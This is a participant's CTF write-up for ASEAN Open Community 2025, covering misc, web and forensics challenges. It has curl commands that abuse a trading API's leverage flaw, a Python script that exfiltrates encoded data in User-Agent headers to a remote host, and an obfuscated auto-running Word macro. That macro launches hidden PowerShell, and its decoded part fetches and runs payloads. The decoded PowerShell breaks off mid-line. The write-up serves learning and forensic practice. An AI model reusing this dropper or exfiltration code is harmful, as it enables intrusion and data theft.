# ASEAN Open Community 2025

Got 49th Place, International, Individual CTF! Solved one forensics that only 5 partici\[at solve it. THe only Malaysian solved it. A few challenge gone wrong

## MISC

### Sanity Test

<details>

<summary>Description</summary>

Please complete this challenge, if you can't spawn container or submit flag, open ticket in discord asap.

**Note** please use nc to connect the server

</details>

```bash
$ nc instance.asean-openctf2025.site 32530
```

`flag{sAN17Y_CH3cK_f0R_4SEAN_ct1_2c7b03cb85bf}`

***

### EasyCloudy

<details>

<summary>Description</summary>

You found a site hosted by AWS in EasyKloudy, can you find something else?

Target: dnx0dc8fxdebj.cloudfront.net

</details>

I think this was unintended

```bash
$ curl -s https://dnx0dc8fxdebj.cloudfront.net/flag.txt
```

`flag{960542d6475e79e38e36a49862676e66}`

## WEB

### BitTrader

<details>

<summary>Description</summary>

Trade and you'll get the flag

</details>

The API exposes an **institutional block order** with leverage. After “farming” enough volume to unlock the tier, placing a leveraged institutional buy **credits BTC as if with borrowed funds** but the **portfolio value calculation ignores the liability**. The portfolio value jumps over $100k and the server returns the achievement + flag.

**Recon**

The site has two pages:

* **Trading UI** (/) with Buy/Sell forms.
* **API Docs** (/api-docs) describing:
  * Auth via X-Session-ID
  * GET /api/portfolio
  * POST /api/trading/buy
  * POST /api/account/upgrade
  * Note: _“Achievement System: Reach $100,000 portfolio value for special recognition.”_
  * Upgrade gates: **institutional** after $50k trading volume; advanced leverage available.

Observation: The backend treats **session state** by the X-Session-ID header—keep it constant per account.

**Exploit plan**

1. Use a fresh X-Session-ID.
2. **Build $50k totalVolume** with repeated market buys (volume gate for upgrade).
3. **Upgrade** to institutional.
4. Ensure enough **USD balance** to submit a large block order (sell BTC back if needed).
5. Place a **leveraged institutional buy** (amount ≥ 40000, orderType: institutional, leverage: 10).
6. GET /api/portfolio → portfolio value > $100k → **achievement** object with **flag**.

**Step-by-step (commands & real outputs)**

**0) Session & initial state**

```bash
S=fdb19f92b47a37ff
curl -s -H "X-Session-ID: $S" http://instance.asean-openctf2025.site:30292/api/portfolio
```

**Result:**

```bash
{"success":true,"portfolio":{
"usdBalance":50000,"btcBalance":0,
"portfolioValue":50000,"accountTier":"standard","totalVolume":0}}
```

**1) Farm volume (10 × $5k market buys)**

```bash
for i in {1..10}; do
curl -s -X POST http://instance.asean-openctf2025.site:30292/api/trading/buy \
-H "Content-Type: application/json" \
-H "X-Session-ID: $S" \
-d '{"amount":5000,"orderType":"market"}' >/dev/null
done
curl -s -H "X-Session-ID: $S" http://instance.asean-openctf2025.site:30292/api/portfolio
```

**Result:**

```bash
{"success":true,"portfolio":{
"usdBalance":0,"btcBalance":~1.1098,
"accountTier":"standard","totalVolume":50000}}
```

**2) Upgrade to institutional**

```bash
curl -s -X POST http://instance.asean-openctf2025.site:30292/api/account/upgrade -H "Content-Type: application/json" -H "X-Session-ID: $S" -d '{"tier":"institutional"}'
```

**Result:**

```bash
{"success":true,"message":"Institutional tier activated","tier":"institutional"}
```

**3) Ensure USD for the big order (sell BTC back if needed)**

(After selling, I had \~$49,961 USD; nearly zero BTC.)

```bash
curl -s -H "X-Session-ID: $S" http://instance.asean-openctf2025.site:30292/api/portfolio
```

**Result:**

```bash
{"success":true,"portfolio":{
"usdBalance":49961.40506756716,"btcBalance":0.0000000039765,
"accountTier":"institutional","totalVolume":50000}}
```

**4) Place the leveraged institutional block order**

```bash
curl -s -X POST http://instance.asean-openctf2025.site:30292/api/trading/buy -H "Content-Type: application/json" -H "X-Session-ID: $S" -d '{"amount": 40000, "orderType": "institutional", "leverage": 10}'
```

**Result:**

```bash
{
"success": true,
"message": "institutional order executed successfully",
"transaction": {
"orderType": "institutional",
"amount": 40000,
"effectiveAmount": 200000,
"leverage": 5,
"btcReceived": 4.525006880303285,
"fee": 0,
"specialPricing": true
},
"portfolio": {
"usdBalance": 9961.40506756716,
"btcBalance": 4.5250068842798665,
"portfolioValue": 214043.0378999756,
"totalVolume": 90000
}
}
```

Note the backend **capped leverage to 5** (not 10), but still credited BTC on an **effectiveAmount** of $200k.

**5) Portfolio now > $100k ⇒ Achievement + flag**

```bash
curl -s -H "X-Session-ID: $S" http://instance.asean-openctf2025.site:30292/api/portfolio
```

**Result:**

```bash
{"success":true,"portfolio":{
"usdBalance":9961.40506756716,
"btcBalance":4.5250068842798665,
"portfolioValue":213941.85167776668,
"accountTier":"institutional","totalVolume":90000},
"achievement":{
"title":"Trading Excellence Achieved",
"description":"Portfolio value exceeded $100,000 through advanced trading strategies",
"flag":"flag{7HE_BES7_traDES_0F7en_CoME_To_tho5e_WhO_W4It_5f07e177a164}",
"finalValue":213941.85167776668
}}
```

\
`flag{7HE_BES7_traDES_0F7en_CoME_To_tho5e_WhO_W4It_5f07e177a164}`

## FORESICS

### Intruder Alert

Read readme.md

`flag{53232d33e87d3480dc715b5262e31aec}`

Yep... broken challenge. But let me copy paste the solution

#### eventful

This is a log analysis challenge where participants analyse logs to identify suspicious activity and determine the data exfiltrated by attackers.

We are provided with two files: `iis.log` and `squid_access.log`.

#### Step 1 - Inspecting squid.log

Since `squid.log` is smaller, we can start by inspecting it. This log file contains HTTP requests made through a Squid proxy server.

```txt
1745555552.950 456 18.137.225.131 TCP_MISS/200 1690 GET http://www.brown.com/tagabout.html - HIER_DIRECT/133.109.177.53 text/html
1745555553.950 456 5.124.137.113 TCP_MISS/200 2827 GET http://www.scott.com/app/tagsfaq.html - HIER_DIRECT/45.175.238.144 text/html
1745555558.950 456 118.138.217.229 TCP_MISS/200 1094 GET https://www.sanchez-salinas.com/exploresearch.jsp - HIER_DIRECT/20.124.159.150 text/html
1745555558.950 456 36.43.80.246 TCP_MISS/200 1237 GET http://williams.com/search/explore/tagauthor.html - HIER_DIRECT/145.109.12.44 text/html
1745555564.950 456 156.4.63.235 TCP_MISS/200 2696 GET https://www.pearson-watson.net/tagregister.php - HIER_DIRECT/74.184.90.135 text/html
```

The log entries contain the following fields:

* **IP Address**: The IP address of the client making the request.
* **URL**: The URL being accessed.

Try to identify any patterns or anomalies in the requests.

```bash
cut -d ' ' -f3 squid.log | sort | uniq -c | sort -nr | head

# Output
     21 192.168.200.52
      1 99.66.225.187
      1 99.112.49.147
      1 98.51.63.165
      1 96.61.32.77
      1 96.228.174.243
      1 96.199.219.17
      1 96.17.9.21
      1 96.157.81.22
      1 95.95.34.80
```

The IP address `192.168.200.52` is the most active one, with 21 requests. We can assume this is the attacker's IP address.

Now, we can filter the `squid.log` file to only include requests from this IP address.

```bash
grep '192.168.200.52' squid.log

# Output
1754878363.759 123 192.168.200.52 TCP_MISS/200 2959 GET https://pypi.org/project/colorama/ - HIER_DIRECT/93.184.216.34 text/html
1754878645.759 123 192.168.200.52 TCP_MISS/200 598 GET https://pypi.org/project/pycryptodome/ - HIER_DIRECT/93.184.216.34 text/html
1754878423.759 123 192.168.200.52 TCP_MISS/200 886 GET https://pypi.org/project/requests/ - HIER_DIRECT/93.184.216.34 text/html
1754878399.759 123 192.168.200.52 TCP_MISS/200 1650 GET https://bootstrap.pypa.io/get-pip.py - HIER_DIRECT/93.184.216.34 text/html
1754878583.759 123 192.168.200.52 TCP_MISS/200 588 GET https://pastebin.com/raw/jLNPr7Xa - HIER_DIRECT/93.184.216.34 text/html
1754878793.759 123 192.168.200.52 TCP_MISS/200 2245 GET https://pypi.org/project/fake-useragent/ - HIER_DIRECT/93.184.216.34 text/html
1754879381.759 123 192.168.200.52 TCP_MISS/200 2047 GET https://pypi.org/project/colorama/ - HIER_DIRECT/93.184.216.34 text/html
1754879188.759 123 192.168.200.52 TCP_MISS/200 2007 GET https://pastebin.com/raw/jLNPr7Xa - HIER_DIRECT/93.184.216.34 text/html
1754879368.759 123 192.168.200.52 TCP_MISS/200 1791 GET https://bootstrap.pypa.io/get-pip.py - HIER_DIRECT/93.184.216.34 text/html
1754880249.759 123 192.168.200.52 TCP_MISS/200 2266 GET https://pypi.org/project/colorama/ - HIER_DIRECT/93.184.216.34 text/html
1754879668.759 123 192.168.200.52 TCP_MISS/200 962 GET https://pypi.org/project/pycryptodome/ - HIER_DIRECT/93.184.216.34 text/html
1754879833.759 123 192.168.200.52 TCP_MISS/200 696 GET https://pypi.org/project/base64/ - HIER_DIRECT/93.184.216.34 text/html
1754879455.759 123 192.168.200.52 TCP_MISS/200 1515 GET https://pypi.org/project/pycryptodome/ - HIER_DIRECT/93.184.216.34 text/html
1754880865.759 123 192.168.200.52 TCP_MISS/200 2245 GET https://pypi.org/project/requests/ - HIER_DIRECT/93.184.216.34 text/html
1754881435.759 123 192.168.200.52 TCP_MISS/200 622 GET https://pypi.org/project/base64/ - HIER_DIRECT/93.184.216.34 text/html
1754881795.759 123 192.168.200.52 TCP_MISS/200 1804 GET https://pastebin.com/raw/jLNPr7Xa - HIER_DIRECT/93.184.216.34 text/html
1754879389.759 123 192.168.200.52 TCP_MISS/200 686 GET https://pypi.org/project/base64/ - HIER_DIRECT/93.184.216.34 text/html
1754881309.759 123 192.168.200.52 TCP_MISS/200 2490 GET https://pypi.org/project/requests/ - HIER_DIRECT/93.184.216.34 text/html
1754881957.759 123 192.168.200.52 TCP_MISS/200 2282 GET https://pastebin.com/raw/jLNPr7Xa - HIER_DIRECT/93.184.216.34 text/html
1754882587.759 123 192.168.200.52 TCP_MISS/200 1904 GET https://pastebin.com/raw/jLNPr7Xa - HIER_DIRECT/93.184.216.34 text/html
1754881711.759 123 192.168.200.52 TCP_MISS/200 592 GET https://bootstrap.pypa.io/get-pip.py - HIER_DIRECT/93.184.216.34 text/html
```

We can see that the attacker is accessing various URLs, including:

* `https://pastebin.com/raw/jLNPr7Xa` — a pastebin link (which is sus),
* Several URLs from `pypi.org` — to install Python packages?
* `https://bootstrap.pypa.io/get-pip.py` — downloading pip, Python scripting?

Let’s check the pastebin link to see if it contains any information:

```python
import base64
import requests

flag = ""
dom = ""
key = "acsc"

def xor_encrypt(data: str, key: str) -> str:
    return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))

def encode_flag(data: str, key: str) -> str:
    x = xor_encrypt(data, key)
    return base64.b64encode(x.encode()).decode()

def chunked(text: str, size: int):
    for i in range(0, len(text), size):
        yield text[i:i + size]

def send_chunks(chunks, dom: str):
    if not dom:
        return
    url = f"http://{dom}/data"
    with requests.Session() as s:
        for ch in chunks:
            ua = f"Mozilla/5.0 (Windows NT 4.0) AppleWebKit/531.1 (KHTML, like Gecko) Chrome/38.0.849.0 Safari/531.1/{ch})"
            s.get(url, headers={"User-Agent": ua}, timeout=10)

def main():
    encoded = encode_flag(flag, key)
    send_chunks(chunked(encoded, 6), dom)

if __name__ == "__main__":
    main()
```

This script:

1. XOR encrypts a flag using the key `acsc`
2. Base64 encodes the result
3. Splits the encoded string into 6-character chunks
4. Sends each chunk in a `User-Agent` string in requests to `/data`

This is most likely how the attacker is exfiltrating data.

#### iis.log

The `iis.log` file is much larger, so we will need to filter it down to find the relevant information.

We can filter for the attacker's IP address and dump it into another file for easier analysis.

```bash
grep '192.168.200.52' iis.log > atk.log
```

To retrieve the chunks of data that were sent in the `User-Agent` header, we can use the following command:

```bash
rep 'Safari/531.1/' atk.log | cut -d '/' -f7 | tr -d '()"'
Bw8SB
BpWQF
FSURd
QUgZL
VAVQR
1tRBx
BUUFY
RVlNV
QQZSU
hIGAh
4=
```

Now, we can decode the base64 encoded chunks and concatenate them to get the final flag.

```python
import base64

chunks = ["Bw8SB", "BpWQF", "FSURd", "QUgZL", "VAVQR", "1tRBx", "BUUFY", "RVlNV", "QQZSU", "hIGAh", "4="]
key = "acsc"

def dec(data, key):
    return ''.join(chr(ord(c)^ord(key[i % len(key)])) for i, c in enumerate(data))

encoded = ''.join(chunks)
b64_decoded = base64.b64decode(encoded).decode()
flag = dec(b64_decoded, key)
print(flag)
```

We will get the flag `flag{53232d33e87d3480dc715b5262e31aec}`.

### Copy Paste

Theres base64 in DNS. Extracting it using tshark and cut

```bash
tshark -r capture.pcapng -Y 'dns.flags.response==0 && dns.qry.name matches "^[0-9]{4}\\.[A-Za-z0-9_\\-+/=]+\\.(covert-data\\.local)\\.?$"' -T fields -E header=n -e dns.qry.name
```

then beautify it and decode it. Found the header is mcGraphModel.

![](<../.gitbook/assets/1 (3).png>)

Research about it and it say we can open it in draw.io

![](<../.gitbook/assets/2 (3).png>)

Change to md5

`flag{725558146660072b42ced5b2afea0ad5}`

### Letter of Motivation

<details>

<summary>Description</summary>

Your customer has been hacked, and as a SOC analyst, you're receiving evidence related to a malware infection. Can you investigate and uncover the malware behind the breach?

</details>

The challenge said the password is infected. Then the challenge file is .docs so without further ado I directly use olevba to see the macro.

```python
Sub AutoOpen():
    vMl1qw12
End Sub
Public Sub cDm1qvB():
    Dim gGuwPl1 As String
    Dim gGuwPl2 As String
    Dim gGuwPl3 As String
    Dim gGuwPl4 As String
    Dim gGuwPl5 As String
    Dim gGuwPl6 As String
    Dim gGuwPl7 As String
    Dim gGuwPl8 As String
    Dim gGuwPl9 As String
    Dim gGuwPl10 As String
    Dim gGuwPl11 As String
    Dim gGuwPl12 As String
    Dim gGuwPl13 As String
    gGuwPl1 = "IABzAEUAVAAtAEkAdABlAE0AIAB2AGEAUgBJAGEAYgBsAGUAOgBDAFkAUgBkACAAIAAoACAAIABbAFQAWQBQAEUAXQAoACIAewA0AH0AewAwAH0AewAxAH0AewAyAH0AewAzAH0AewA1AH0AIgAgAC0ARgAgACcATQAuACcALAAnAEkATwAnACwAJwAuACcALAAnAGQAaQByAGUAQwBUACcALAAnAHMAeQBzAHQAZQAnACwAJwBvAHIAeQAnACkAIAApACAAIAA7ACAAcwBlAFQALQBJAFQARQBNACAAKAAiAFYAYQBSAGkAIgArACIAYQBCAEwAZQA6ACIAKwAiAGEAMABsAHEATgAiACkAIAAgACgAIAAgAFsAdABZAFAARQBdACgAIgB7ADMAfQB7ADUAfQB7ADcAfQB7ADQAfQB7ADEAfQB7ADIAfQB7ADYAfQB7ADAAfQAiACAALQBGACAAJwBHAEUAcgAnACwAJwBwAE8AJwAsACcAaQBOAFQAbQBhAE4AJwAsACcAcwBZACcALAAnAGkAYwBlACcALAAnAFM"
    gGuwPl3 = "AKwAnAGkAdAB7ADAAfQBLACcAKwAoACcAOQB0ACcAKwAnAGEAJwApACsAKAAnAHEANQAnACsAJwA0ACcAKQArACcAewAnACsAJwAwAH0AJwApACAALQBmAFsAQwBIAGEAcgBdADkAMgApACkAOwAkAEUAbABtAGEAYgBsADYAPQAoACgAJwBVACcAKwAnADcAYgBtACcAKQArACcAZgAnACsAJwBlAGUAJwApADsAIAAoAGwAcwAgACAAKAAiAFYAYQByAGkAIgArACIAQQBiAEwAZQA6ACIAKwAiAGEAMABMAFEATgAiACkAIAAgACkALgB2AEEATABVAGUAOgA6ACIAcwBFAGMAVQByAGkAdABZAFAAUgBvAHQATwBDAE8AbAAiACAAPQAgACgAKAAnAFQAbAAnACsAJwBzACcAKQArACcAMQAyACcAKQA7ACQARABlAHAAZwAxAGYAawA9ACgAJwBFAGQAJwArACgAJwBiAGEAaQAnACsAJwA5AHoAJwApACkAOwAkAFYAXwAzAGcAcwByAG0AIAA9ACAAKAAoACcAVAAxACcAKwA"
    gGuwPl2 = "AVABFAE0ALgBuAEUAVAAnACwAJwBBACcALAAnAC4AcwBlAFIAdgAnACkAIAApACAAIAA7ACAAJABLAHUAcwB0AHoAOQB6AD0AKAAoACcAUQAnACsAJwAyAGwAJwApACsAKAAnAG4ANABtACcAKwAnADIAJwApACkAOwAkAEEAMgBmAGIAZgBwAHEAPQAkAFIAcQAzAHMAegA5ADMAIAArACAAWwBjAGgAYQByAF0AKAA2ADQAKQAgACsAIAAkAE0AbgAzAHYAMABtAHgAOwAkAFkAdwB4AHYAOQA5AGoAPQAoACcATAAnACsAKAAnAHoAegAnACsAJwA1ACcAKQArACgAJwA5ACcAKwAnAGYAeAAnACkAKQA7ACAAIAAoACAAIAB2AGEAcgBpAGEAQgBMAGUAIABDAHkAUgBEACAAIAApAC4AdgBBAGwAdQBlADoAOgAiAGMAUgBFAEEAVABFAEQAaQByAGUAYwB0AG8AUgB5ACIAKAAkAEgATwBNAEUAIAArACAAKAAoACcAewAwAH0AUABlADMAbQAnACsAJwB2ACc"
    gGuwPl7 = "nACkAKQArACcAKAAnACsAJwApACcAKwAnACgAJwArACgAKAAnACkAVwAnACkAKQArACgAKAAnAE4AKQAnACsAJwAoAHcAJwApACkAKwAnAGUAYgAnACsAJwAuAGEAJwArACcAbgAnACsAJwBhAHQAJwArACcAbwBtACcAKwAoACcAeQAnACsAJwAuAG8AJwApACsAJwByACcAKwAnAGcALgAnACsAKAAoACcAegBhACcAKwAnACkAKAApAFcAJwApACkAKwAnAE4AJwArACgAKAAnACkAKAAnACsAJwB3AGwAJwApACkAKwAoACcAMAAnACsAJwAxAGUAcgAxAGwAJwArACcAOAAnACkAKwAoACcALgB6ACcAKwAnAGkAcAAnACsAJwBAAGgAdAB0ACcAKQArACcAcAA6ACcAKwAnACkAJwArACgAJwAoACkAVwAnACsAJwBOACcAKQArACgAKAAnACkAKAApACcAKwAnACgAKQBXACcAKwAnAE4AKQAnACkAKQArACcAKAAnACsAKAAnAGUAJwArACcAcgBwACcAKwAnAC4AaQBsAHQA"
    gGuwPl5 = "KwAnAGwAJwApADsAJABaADUAcAB2AG4AagA2AD0AKAAoACcAUAAyACcAKwAnAHAAJwApACsAJwA3ACcAKwAoACcAaQAnACsAJwA3AHYAJwApACkAOwAkAEoANAA1AGYAZgA1AGcAPQBOAEUAdwAtAE8AQgBqAEUAYwBUACAATgBFAHQALgBXAEUAYgBDAGwAaQBFAE4AVAA7ACQAQQB6ADgAbgBzAHIAZAA9ACgAKAAoACcAaAAnACsAJwB0AHQAJwApACsAKAAoACcAcABzADoAKQAnACsAJwAoACcAKQApACsAKAAoACcAKQAnACsAJwBXAE4AJwArACcAKQAoACkAKAAnACkAKQArACcAKQAnACsAJwBXAE4AJwArACcAKQAnACsAKAAoACcAKAAnACsAJwBoACcAKwAnAHIALgBkAGkAZwBpAG0AYQAnACsAJwB4AC4AYwAnACsAJwBvAC4AdQAnACkAKQArACgAKAAnAGsAKQAnACkAKQArACcAKAApACcAKwAnAFcATgAnACsAKAAoACcAKQAoAGUAJwArACcAOQAzACcAKwAnAHQAJwArACcA"
    gGuwPl4 = "nAG8AeAAnACkAKwAoACcAXwAnACsAJwB3AGYAJwApACkAOwAkAFUAZgA0AGIANwA5AHQAPQAoACcAUABuACcAKwAoACcAMQAnACsAJwA0ADEAJwApACsAJwBxAG0AJwApADsAJABBAHcANQA5AGoANgBqAD0AKAAoACcARgAyACcAKwAnAHcAcAAxACcAKQArACcAcgBsACcAKQA7ACQAUQBlAG8AbgB3AHIAagA9ACQASABPAE0ARQArACgAKAAoACcAdAAnACsAJwBEADQAJwApACsAJwBQAGUAJwArACgAJwAzACcAKwAnAG0AdgBpACcAKQArACgAJwB0AHQARAAnACsAJwA0AEsAOQB0AGEAJwArACcAcQAnACkAKwAnADUAJwArACgAJwA0AHQARAAnACsAJwA0ACcAKQApAC4AIgBSAEUAUABsAEEAYwBlACIAKAAoAFsAYwBIAEEAUgBdADEAMQA2ACsAWwBjAEgAQQBSAF0ANgA4ACsAWwBjAEgAQQBSAF0ANQAyACkALAAnAFwAJwApACkAKwAkAFYAXwAzAGcAcwByAG0AKwAoACgAJwAuAGQAJwArACcAbAAnACkA"
    gGuwPl6 = "dAB2AGcAJwApACkAKwAnAHUAJwArACgAJwBmAC4AJwArACcAcABkAGYAQABoAHQAJwArACcAdAAnACkAKwAnAHAAcwAnACsAKAAoACcAOgAnACsAJwApACgAKQBXACcAKQApACsAKAAoACcATgAnACsAJwApACgAKQAoACkAVwBOACcAKwAnACkAKAAnACsAJwBlACcAKQApACsAJwBkAHUAJwArACcAYwAnACsAJwBhACcAKwAoACcAdAAnACsAJwBpAG8AJwApACsAKAAnAG4AMAAxAC4AJwArACcAcwB1AHQAJwArACcAbwAnACkAKwAoACcAdwAnACsAJwBlAGIALgAnACkAKwAnAGMAJwArACgAKAAnAG8AbQAnACsAJwApACcAKQApACsAKAAnACgAKQAnACsAJwBXAE4AJwApACsAKAAoACcAKQAoAGcAJwArACcAbQB0ACcAKwAnADYAcwAwAG8AJwApACkAKwAoACcALgB6ACcAKwAnAGkAJwApACsAKAAnAHAAQABoAHQAdAAnACsAJwBwACcAKQArACcAcwAnACsAKAAoACcAOgApACgAKQBXAE4AJwArACcAKQA"
    gGuwPl10 = "AAnACgAJwArACcAKQBXAE4AKQAnACkAKQArACgAKAAnACgAcwAnACkAKQArACcAcAAnACsAKAAnAGEAYwBlAGMAJwArACcAYQAnACkAKwAnAG0AJwArACgAKAAnAHAALgAnACsAJwBpAG4AKQAnACkAKQArACgAKAAnACgAKQBXAE4AJwArACcAKQAoACcAKQApACsAKAAnAGgAMwAnACsAJwA4AGsAaQA4AGoAJwApACsAJwBrACcAKwAnAHoAJwArACcALgAnACsAJwBwAGQAJwArACcAZgBAACcAKwAnAGgAJwArACcAdAAnACsAJwB0ACcAKwAnAHAAOgAnACsAJwApACcAKwAoACgAJwAoACkAVwBOACcAKwAnACkAJwArACcAKAAnACkAKQArACgAKAAnACkAKAAnACsAJwApACcAKQApACsAJwBXAE4AJwArACgAKAAnACkAJwArACcAKABzACcAKwAnAGEAcgBhAG0AbwAnACkAKQArACgAJwBuAGkAYwAuAG0AZQAnACsAJwBkACcAKQArACgAJwBpACcAKwAnAGEAZABvACcAKQArACgAJwB0ACcAKwAnAC"
    gGuwPl11 = "4AaAAnACkAKwAnAHUAJwArACgAKAAnACkAKAAnACkAKQArACgAKAAnACkAVwAnACsAJwBOACkAKAAnACkAKQArACcAYgAnACsAKAAnADYAegBpAGMAJwArACcAbgAnACsAJwAuACcAKQArACgAJwB6ACcAKwAnAGkAcAAnACkAKQApAC4AIgByAGUAUABsAEEAYwBFACIAKAAoACgAKAAoACcAKQAnACsAJwAoACkAVwAnACkAKQArACgAKAAnAE4AJwArACcAKQAoACcAKQApACkAKQAsACgAWwBhAHIAcgBhAHkAXQAoACcALwAnACkALAAoACcAaAAnACsAJwB3AGUAJwApACkAWwAwAF0AKQAuACIAUwBQAEwAaQBUACIAKAAkAEsAbgB3AG4ANABoAG4AIAArACAAJABBADIAZgBiAGYAcABxACAAKwAgACQAWAAwADUAZgBtAGQAdwApADsAcwBlAFQALQBJAFQARQBNACAAKAAiAFYAYQBSAGkAIgArACIAYQBCAEwAZQA6ACIAKwAiAGEAMQBsAHEATgAiACkAIAAgACgAIAAgAFsAdABZAFAARQBdACgAIg"
    gGuwPl8 = "ZQAnACkAKwAoACgAJwBjAC4AJwArACcAYwBvACkAJwArACcAKAApACcAKQApACsAKAAoACcAVwBOACcAKwAnACkAJwApACkAKwAnACgAJwArACcAcABzACcAKwAoACcAaAAnACsAJwBwAG0AJwApACsAJwA4ACcAKwAnAC4AcgAnACsAKAAnAGEAcgAnACsAJwBAACcAKQArACgAJwBoACcAKwAnAHQAdABwACcAKQArACcAcwA6ACcAKwAnACkAJwArACgAKAAnACgAJwArACcAKQBXAE4AKQAnACkAKQArACgAKAAnACgAKQAnACsAJwAoACkAVwBOACcAKwAnACkAKAAnACkAKQArACgAJwBlAHMAJwArACcAdABlAHIAJwApACsAKAAnAG4AJwArACcAaQAuAGcAJwApACsAKAAnAHIAYQAnACsAJwB0AGkAYQAnACkAKwAnAGUAdAAnACsAJwBzACcAKwAnAGEAbAAnACsAJwB1ACcAKwAoACcAcwAuAGkAJwArACcAdAAnACkAKwAnACkAJwArACgAKAAnA"
    gGuwPl9 = "CgAKQAnACsAJwBXAE4AKQAnACkAKQArACgAKAAnACgAbwA1ACcAKwAnAHAAJwApACkAKwAnAGkAeAAnACsAJwBpACcAKwAoACcALgBwACcAKwAnAGQAJwApACsAKAAnAGYAQABoACcAKwAnAHQAdAAnACkAKwAoACgAJwBwAHMAOgApACgAJwArACcAKQBXACcAKwAnAE4AKQAoACcAKQApACsAKAAoACcAKQAnACsAJwAoACkAJwApACkAKwAoACgAJwBXACcAKwAnAE4AKQAoACcAKQApACsAJwBoAGUAJwArACgAKAAnAGwAZQBuACcAKwAnAGEAJwArACcAbwBmAGkAYwAnACsAJwBpAGEAJwArACcAbAAuAGMAbwBtACkAKAAnACkAKQArACcAKQAnACsAJwBXAE4AJwArACgAKAAnACkAKAAnACsAJwBsADQAJwApACkAKwAoACcAYgAnACsAJwBnAGcAbAAuAHAAZABmACcAKwAnAEAAJwApACsAKAAoACcAaAB0AHQAJwArACcAcAA6ACcAKwAnACkAKAApACcAKwAnAFcATgApACgAKQAnACkAKQArACgAK"
    gGuwPl12 = "B7ADcAfQB7ADQAfQB7ADMAfQB7ADAAfQB7ADYAfQB7ADEAfQB7ADUAfQB7ADIAfQAiACAALQBGACAAJwA1ADEAZgAnACwAJwA3AGQANQAnACwAJwBmAGEAZAB9ACcALAAnADMAYgBkADIAOQAnACwAJwBnAHsAYgBmADUAYgAnACwAJwA5ADEAOAAzAGQANgAnACwAJwBkADQAZAA0ADQAYQA2ADEAJwAsACcAZgBsAGEAJwApACAAKQAgACAAOwAkAEIAaAA1ADgAYgAyAHkAPQAoACcAVAB2ACcAKwAnAG4AdAAnACsAKAAnAHAAbwAnACsAJwB3ACcAKQApADsAZgBvAHIAZQBhAGMAaAAgACgAJABPAF8ANQBsAGQAMABvACAAaQBuACAAJABBAHoAOABuAHMAcgBkACAAfAAgAHMAbwBSAHQALQBPAGIAagBlAGMAdAAgAHsAZwBlAHQALQByAGEAbgBkAG8ATQB9ACkAewB0AHIAeQB7ACQASgA0ADUAZgBmADUAZwAuACIARABPAHcATgBsAE8AQQBkAEYASQBMAGUAIgAoACQATwBfADUAbABkADAAbwAsACA"
    gGuwPl13 = "AJABRAGUAbwBuAHcAcgBqACkAOwAkAEQAbABiAG0ANwAwADEAPQAoACgAJwBNAHIAegBwACcAKwAnAHAAJwApACsAJwB6ADkAJwApADsASQBmACAAKAAoACYAKAAnAEcAZQB0AC0ASQAnACsAJwB0AGUAbQAnACkAIAAkAFEAZQBvAG4AdwByAGoAKQAuACIATABlAE4ARwBUAGgAIgAgAC0AZwBlACAAMwA5ADkAMQA2ACkAIAB7ACYAKAAnAHIAdQBuACcAKwAnAGQAbABsADMAMgAuACcAKwAnAGUAJwArACcAeABlACcAKQAgACQAUQBlAG8AbgB3AHIAagAsADAAOwAkAEkANQBiAGIAegBqAHgAPQAoACcAVgB3ACcAKwAnAGgAJwArACgAJwA2ACcAKwAnADUAdABzACcAKQApADsAYgByAGUAYQBrADsAJABOAGEAYQBjAGoAaQBkAD0AKAAnAEIAcQAnACsAKAAnAHUAYwAnACsAJwBqAG4AYwAnACkAKQB9AH0AYwBhAHQAYwBoAHsAfQB9ACQAVwBwAGQAdgB2AGoAcQA9ACgAKAAnAEsAeQAnACsAJwBiAG0AcwAnACkAKwAnADkAeAAnACkA"
End Sub
Sub vMl1qw12():
    Dim Yjvcbwm As String
    Dim jQfedqm As String
    Dim cOaCoR As String
    jQfedqm = "-eNCoD" & Chr(101) & "d" & Chr(67) & Chr(111) & Chr(77) & Chr(109) & Chr(65) & Chr(78) & Chr(100) & " "
    cOaCoR = "powershell.exe -w hIdDeN " & jQfedqm
    aQhdMI (cOaCoR)
End Sub
Sub aQhdMI(hImFk As String)
    Dim vRauLe As String
    Call cDm1qvB
    vRauLe = hImFk & gGuwPl1 & gGuwPl2 & gGuwPl3 & gGuwPl4 & gGuwPl5 & gGuwPl6 & gGuwPl7 & gGuwPl8 & gGuwPl9 & gGuwPl10 & gGuwPl11 & gGuwPl12 & gGuwPl13
    CreateObject(Wscript.Shell).Run vRauLe
End Sub
Sub Auto_Open():
    AutoOpen
End Sub
Sub Document_Open()
    Auto_Open
End Sub
```

Decode it to get this

{% code overflow="wrap" %}
```powershell
sET-IteM vaRIable:CYRd ( [TYPE]("{4}{0}{1}{2}{3}{5}" -F 'M.','IO','.','direCT','syste','ory') ) ; seT-ITEM ("VaRi"+"aBLe:"+"a0lqN") ( [tYPE]("{3}{5}{7}{4}{1}{2}{6}{0}" -F 'GEr','pO','iNTmaN','sY','ice','STEM.nET','A','.seRv') ) ; $Kustz9z=(('Q'+'2l')+('n4m'+'2'));$A2fbfpq=$Rq3sz93 + [char](64) + $Mn3v0mx;$Ywxv99j=('L'+('zz'+'5')+('9'+'fx')); ( variaBLe CyRD ).vAlue::"cREATEDirectoRy"($HOME + (('{0}Pe3m'+'v'+'it{0}K'+('9t'+'a')+('q5'+'4')+'{'+'0}') -f[CHar]92));$Elmabl6=(('U'+'7bm')+'f'+'ee'); (ls ("Vari"+"AbLe:"+"a0LQN") ).vALUe::"sEcUritYPRotOCOl" = (('Tl'+'s')+'12');$Depg1fk=('Ed'+('bai'+'9z'));$V_3gsrm = (('T1'+'ox')+('_'+'wf'));$Uf4b79t=('Pn'+('1'+'41')+'qm');$Aw59j6j=(('F2'+'wp1')+'rl');$Qeonwrj=$HOME+((('t'+'D4')+'Pe'+('3'+'mvi')+('ttD'+'4K9ta'+'q')+'5'+('4tD'+'4'))."REPlAce"(([cHAR]116+[cHAR]68+[cHAR]52),'\'))+$V_3gsrm+(('.d'+'l')+'l');$Z5pvnj6=(('P2'+'p')+'7'+('i'+'7v'));$J45ff5g=NEw-OBjEcT 